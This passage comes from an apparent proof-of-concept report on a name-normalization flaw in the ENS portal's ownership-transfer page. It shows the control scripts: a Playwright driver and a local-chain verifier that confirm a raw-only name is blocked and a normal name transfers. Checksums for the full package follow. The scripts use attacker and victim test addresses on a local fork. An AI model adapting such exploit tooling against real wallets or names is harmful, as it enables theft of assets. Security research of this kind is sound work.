      rawOnly: rawOnlyOwner,
      normalizedRawOnly: normalizedRawOnlyOwner,
    },
    normalRole,
    missingCanonicalRole,
    preUiBlockNumber: (await publicClient.getBlockNumber()).toString(),
  }
  await writeFile(outputPath, `${JSON.stringify(state, null, 2)}\n`)
  console.log(JSON.stringify(state, null, 2))
  console.log('CONTROL_SEED_RESULT=PASS_R7M3K9')
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

Save the control browser driver as `ens-fullwidth-poc/scripts/drive-portal-controls-r7m3k9.py`:

```python
import json
import os
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import TimeoutError as PlaywrightTimeoutError
from playwright.sync_api import sync_playwright


STATE_PATH = Path(os.environ["POC_CONTROL_STATE_PATH"])
ARTIFACT_DIR = Path(os.environ["POC_ARTIFACT_DIR"])
PORTAL_URL = os.environ.get("PORTAL_URL", "http://127.0.0.1:3001")
state = json.loads(STATE_PATH.read_text(encoding="utf-8"))


def require(condition: bool, message: str) -> None:
    if not condition:
        raise RuntimeError(f"ASSERTION_FAILED: {message}")


def route_for(name: str) -> str:
    return f"{PORTAL_URL}/{quote(name, safe='.')}/ownership/transfer"


def settle(page) -> None:
    try:
        page.wait_for_load_state("networkidle", timeout=15_000)
    except PlaywrightTimeoutError:
        pass


rpc_entries = []


def record_request(request) -> None:
    if request.method != "POST" or "127.0.0.1:18547" not in request.url:
        return
    try:
        payload = json.loads(request.post_data or "null")
    except json.JSONDecodeError:
        return
    entries = payload if isinstance(payload, list) else [payload]
    for entry in entries:
        if isinstance(entry, dict) and entry.get("method") == "eth_sendTransaction":
            rpc_entries.append(entry)


with sync_playwright() as playwright:
    browser = playwright.chromium.launch(headless=True)
    context = browser.new_context(viewport={"width": 1440, "height": 1100})
    page = context.new_page()
    page.on("request", record_request)

    # Without a canonical sibling, the normalized role check blocks the form.
    page.goto(route_for(state["rawOnlyName"]), wait_until="domcontentloaded")
    settle(page)
    page.get_by_role("heading", name="Transfer ownership").wait_for(timeout=45_000)
    page.get_by_text("Transfer not available", exact=True).wait_for(timeout=45_000)
    raw_only_text = page.locator("body").inner_text()
    require(state["rawOnlyName"] in raw_only_text, "raw-only route name is not displayed")
    require(
        page.get_by_placeholder("ENS name or address").count() == 0,
        "raw-only route unexpectedly exposes transfer form",
    )
    page.screenshot(
        path=str(ARTIFACT_DIR / "05-control-raw-only-blocked-r7m3k9.png"),
        full_page=True,
    )

    # A canonical name follows the same UI flow and transfers the displayed ID.
    page.goto(route_for(state["normalName"]), wait_until="domcontentloaded")
    settle(page)
    recipient_input = page.get_by_placeholder("ENS name or address")
    recipient_input.wait_for(state="visible", timeout=45_000)
    recipient_input.fill(state["attacker"])
    page.get_by_text(state["attacker"], exact=False).first.wait_for(timeout=20_000)
    transfer_button = page.get_by_role("button", name="Transfer name", exact=True)
    page.wait_for_function(
        "button => !button.disabled",
        arg=transfer_button.element_handle(),
        timeout=30_000,
    )
    transfer_button.click()
    dialog = page.get_by_role("dialog")
    dialog.get_by_role("button", name="Start", exact=True).click()
    normal_label = f'Transfer name - {state["normalName"]}'
    dialog.get_by_text(normal_label, exact=True).wait_for(timeout=20_000)
    dialog.get_by_role("button", name="Open wallet", exact=True).click()
    dialog.get_by_role("button", name="Done", exact=True).wait_for(timeout=60_000)
    page.screenshot(
        path=str(ARTIFACT_DIR / "06-control-normal-success-r7m3k9.png"),
        full_page=True,
    )

    require(len(rpc_entries) == 1, f"expected one control send, got {len(rpc_entries)}")
    request = rpc_entries[0]["params"][0]
    evidence = {
        "verdict": "PASS_NEGATIVE_AND_NORMAL_CONTROLS_R7M3K9",
        "rawOnly": {
            "name": state["rawOnlyName"],
            "normalizedSibling": state["normalizedRawOnlyName"],
            "formBlocked": True,
            "message": "Transfer not available",
        },
        "normal": {
            "name": state["normalName"],
            "modalTransactionLabel": normal_label,
            "walletRpcRequest": request,
        },
    }
    (ARTIFACT_DIR / "control-browser-evidence-r7m3k9.json").write_text(
        json.dumps(evidence, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps(evidence, indent=2))
    print(evidence["verdict"])
    browser.close()
```

Save the control chain verifier as `ens-fullwidth-poc/scripts/poc-raw-label-transfer-control-verify-r7m3k9.ts`:

```typescript
import { readFile, writeFile } from 'node:fs/promises'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getOwner } from '@ensdomains/ensjs/public/v2'
import {
  type Address,
  createPublicClient,
  decodeFunctionData,
  erc1155Abi,
  http,
  zeroAddress,
} from 'viem'
import { sepolia } from 'viem/chains'

const statePath = process.env.POC_CONTROL_STATE_PATH
const outputPath = process.env.POC_CONTROL_VERIFY_PATH
const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:18547'
if (!statePath || !outputPath) throw new Error('control state and verify paths are required')

type State = {
  proof: string
  registry: Address
  victim: Address
  attacker: Address
  normalName: string
  normalTokenId: string
  rawOnlyName: string
  rawOnlyTokenId: string
  normalizedRawOnlyName: string
  preUiBlockNumber: string
}
const state = JSON.parse(await readFile(statePath, 'utf8')) as State
const chain = extendChainWithEns({
  ...sepolia,
  rpcUrls: {
    default: { http: [rpcUrl] },
    public: { http: [rpcUrl] },
  },
})
const client = createPublicClient({ chain, transport: http(rpcUrl) })
const assert = (condition: unknown, message: string): asserts condition => {
  if (!condition) throw new Error(`ASSERTION_FAILED: ${message}`)
}
const sameAddress = (a: Address, b: Address) =>
  a.toLowerCase() === b.toLowerCase()

async function balanceOf(owner: Address, tokenId: bigint) {
  return client.readContract({
    address: state.registry,
    abi: erc1155Abi,
    functionName: 'balanceOf',
    args: [owner, tokenId],
  })
}

async function main() {
  const normalTokenId = BigInt(state.normalTokenId)
  const rawOnlyTokenId = BigInt(state.rawOnlyTokenId)
  const transfers = []
  const latest = await client.getBlockNumber()
  for (let n = BigInt(state.preUiBlockNumber) + 1n; n <= latest; n++) {
    const block = await client.getBlock({ blockNumber: n, includeTransactions: true })
    for (const tx of block.transactions) {
      if (typeof tx === 'string' || !tx.to) continue
      if (!sameAddress(tx.from, state.victim) || !sameAddress(tx.to, state.registry)) continue
      try {
        const decoded = decodeFunctionData({ abi: erc1155Abi, data: tx.input })
        if (decoded.functionName !== 'safeTransferFrom') continue
        const [from, to, tokenId, amount, data] = decoded.args
        transfers.push({
          hash: tx.hash,
          calldata: tx.input,
          from,
          to,
          tokenId: tokenId.toString(),
          amount: amount.toString(),
          data,
        })
      } catch {}
    }
  }
  assert(transfers.length === 1, `expected one normal control transfer, got ${transfers.length}`)
  const transfer = transfers[0]
  assert(BigInt(transfer.tokenId) === normalTokenId, 'normal flow changed token identity')
  assert(sameAddress(transfer.to, state.attacker), 'normal control recipient changed')
  const receipt = await client.getTransactionReceipt({ hash: transfer.hash })
  assert(receipt.status === 'success', 'normal control transaction reverted')

  const [normalOwner, rawOnlyOwner, normalizedRawOnlyOwner] = await Promise.all([
    getOwner(client, { name: state.normalName }),
    getOwner(client, { name: state.rawOnlyName }),
    getOwner(client, { name: state.normalizedRawOnlyName }),
  ])
  assert(sameAddress(normalOwner, state.attacker), 'normal displayed token did not move')
  assert(sameAddress(rawOnlyOwner, state.victim), 'blocked raw-only token moved')
  assert(
    sameAddress(normalizedRawOnlyOwner, zeroAddress),
    'blocked control gained a canonical sibling',
  )
  assert((await balanceOf(state.attacker, normalTokenId)) === 1n, 'attacker lacks normal token')
  assert((await balanceOf(state.victim, rawOnlyTokenId)) === 1n, 'victim lost raw-only token')

  const result = {
    verdict: 'PASS_CHAIN_CONTROLS_R7M3K9',
    normalTransfer: transfer,
    ownersAfter: {
      normal: normalOwner,
      rawOnly: rawOnlyOwner,
      normalizedRawOnly: normalizedRawOnlyOwner,
    },
  }
  await writeFile(outputPath, `${JSON.stringify(result, null, 2)}\n`)
  console.log(JSON.stringify(result, null, 2))
  console.log(result.verdict)
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

Before execution, verify the seven embedded source files from inside `ens-fullwidth-poc` by saving the following as `SHA256SUMS.fullwidth.txt` and running `shasum -a 256 -c SHA256SUMS.fullwidth.txt`:

```
50a652a1f82b074bb0753d4ce586be5c44b1bb9626e847aca714aacc761ae948  run-poc-r7m3k9.zsh
978bdea5811e19e380c52afc932bc45b9c13789915ffd2be2d452ef27358d48f  scripts/drive-portal-controls-r7m3k9.py
046208b884462478f05a98a775eba3e77b2bd3913d11163599616d4427c444d6  scripts/drive-portal-transfer-r7m3k9.py
4ac68e753a857b4339c4f16017c0a967d869fc4317b1d10a8562ed5168b5c7a6  scripts/poc-raw-label-transfer-control-seed-r7m3k9.ts
75c54bbb0173ada6f19c1b8490ed1dc024ff746c08db71f976d1a5cedc263b5f  scripts/poc-raw-label-transfer-control-verify-r7m3k9.ts
019ad8fc35afbc64e69304637fb8af6890f7d503ac96b20e8e9c4e36fa956000  scripts/poc-raw-label-transfer-seed-r7m3k9.ts
efca7d44f6ff3b028e61f973e0092f21b2aa94518cdd9bdbba47c60f2c973e07  scripts/poc-raw-label-transfer-verify-r7m3k9.ts
```

The validated artifacts also bind seed state SHA-256 `b90815efb2cc7cd3bf945c007d6842fc9c31d8399b9ffbcc3cc4d1da188b76a2`, browser evidence SHA-256 `035b455be645281b265defeea90490bec4c79c3738e3055de88aa946fce90f6c`, chain verification SHA-256 `635d2e419c6b9f163e3de80a1511b79a2cb38ebc7ff25c1ac5ab455ba9db47b0`, and verifier-log SHA-256 `f148538c961ae667f4f1b779889e054fb2b56ac80e5eb67cb5d10bc44c7c4ada`. The browser recorded no page-level error. Development-only console warnings and unrelated cross-origin requests did not affect the configured local RPC, the wallet request, the receipt, or any terminal-state assertion.
